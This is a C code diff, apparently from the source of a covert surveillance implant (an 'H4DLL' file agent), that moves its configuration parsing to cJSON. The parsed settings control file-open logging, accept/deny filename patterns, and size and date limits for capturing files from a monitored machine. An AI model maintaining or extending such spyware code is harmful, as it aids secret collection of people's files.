@@ -1,7 +1,7 @@
 #define _CRT_SECURE_NO_WARNINGS 1
 
 #include <Windows.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include <time.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
@@ -266,11 +266,10 @@ BOOL IsFixedDrive(char *path)
 }
 
 // Popola la lista di pattern da includere/escludere
-void PopulatePatternList(JSONObject conf_list)
+static void PopulatePatternList(cJSON *conf_list)
 {
 	DWORD i;
-	JSONArray accept, deny;
-
+	
 	// Libera una precedente lista (se presente)
 	for (i=0; i<pattern_list.accept_count; i++)
 		SAFE_FREE(pattern_list.accept_list[i]);
@@ -282,34 +281,35 @@ void PopulatePatternList(JSONObject conf_list)
 	SAFE_FREE(pattern_list.deny_list);
 	pattern_list.deny_count = 0;
 
+	cJSON* open = cJSON_GetObjectItem(conf_list, "open");
 	// Vede se deve loggare i file open
-	log_file_open = (BOOL) conf_list[L"open"]->AsBool();
-	accept = conf_list[L"accept"]->AsArray();
-	deny = conf_list[L"deny"]->AsArray();
+	log_file_open = (BOOL) cJSON_IsTrue(open);
+	cJSON* accept = cJSON_GetObjectItem(conf_list, "accept");
+	cJSON* deny = cJSON_GetObjectItem(conf_list, "deny");
 
 	// Alloca le due liste
-	if (accept.size() > 0) {
-		pattern_list.accept_list = (WCHAR **)malloc(accept.size() * sizeof(WCHAR *));
+	if (cJSON_GetArraySize(accept) > 0) {
+		pattern_list.accept_list = (WCHAR **)malloc(cJSON_GetArraySize(accept) * sizeof(WCHAR *));
 		if (!pattern_list.accept_list)
 			return;
 	}
 
-	if (deny.size() > 0) {
-		pattern_list.deny_list = (WCHAR **)malloc(deny.size() * sizeof(WCHAR *));
+	if (cJSON_GetArraySize(deny) > 0) {
+		pattern_list.deny_list = (WCHAR **)malloc(cJSON_GetArraySize(deny) * sizeof(WCHAR *));
 		if (!pattern_list.deny_list) {
 			SAFE_FREE(pattern_list.accept_list);
 			return;
 		}
 	}
 
-	pattern_list.accept_count = accept.size();
-	pattern_list.deny_count = deny.size();
+	pattern_list.accept_count = cJSON_GetArraySize(accept);
+	pattern_list.deny_count = cJSON_GetArraySize(deny);
 
 	// ...e parsa tutte le stirnghe unicode
 	for (i=0; i<pattern_list.accept_count; i++) 
-		pattern_list.accept_list[i] = _wcsdup(accept[i]->AsString().c_str());
+		pattern_list.accept_list[i] = cJSON_GetWideStringValue(cJSON_GetArrayItem(accept, i));
 	for (i=0; i<pattern_list.deny_count; i++) 
-		pattern_list.deny_list[i] = _wcsdup(deny[i]->AsString().c_str());
+		pattern_list.deny_list[i] = cJSON_GetWideStringValue(cJSON_GetArrayItem(deny, i));
 }
 
 // Compara due stringhe con wildcard
@@ -519,22 +519,26 @@ DWORD WINAPI PM_FileAgentStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD WINAPI PM_FileAgentInit(JSONObject elem)
+DWORD WINAPI PM_FileAgentInit(cJSON *elem)
 {
 	FILETIME ftime;
 
 	PopulatePatternList(elem);
 
-	if ((BOOL)elem[L"capture"]->AsBool()) {
-		min_fsize = (DWORD) elem[L"minsize"]->AsNumber();
-		max_fsize = (DWORD) elem[L"maxsize"]->AsNumber();
-		HM_TimeStringToFileTime(elem[L"date"]->AsString().c_str(), &ftime); 
+	cJSON* capture = cJSON_GetObjectItem(elem, "capture");
+	if (cJSON_IsTrue(capture)) {
+		cJSON* minsize = cJSON_GetObjectItem(elem, "minsize");
+		cJSON* maxsize = cJSON_GetObjectItem(elem, "maxsize");
+		cJSON* date = cJSON_GetObjectItem(elem, "date");
+		min_fsize = (DWORD)cJSON_GetNumberValue(minsize);
+		max_fsize = (DWORD)cJSON_GetNumberValue(maxsize);
+		HM_TimeStringToFileTime(cJSON_GetStringValue(date), &ftime); 
 		min_date.hi_delay = ftime.dwHighDateTime;
 		min_date.lo_delay = ftime.dwLowDateTime;
 
 	} else {
 		min_fsize = max_fsize = 0;
-		HM_TimeStringToFileTime(L"2100-01-01 00:00:00", &ftime); 
+		HM_TimeStringToFileTime("2100-01-01 00:00:00", &ftime); 
 		min_date.hi_delay = ftime.dwHighDateTime;
 		min_date.lo_delay = ftime.dwLowDateTime;		
 	}
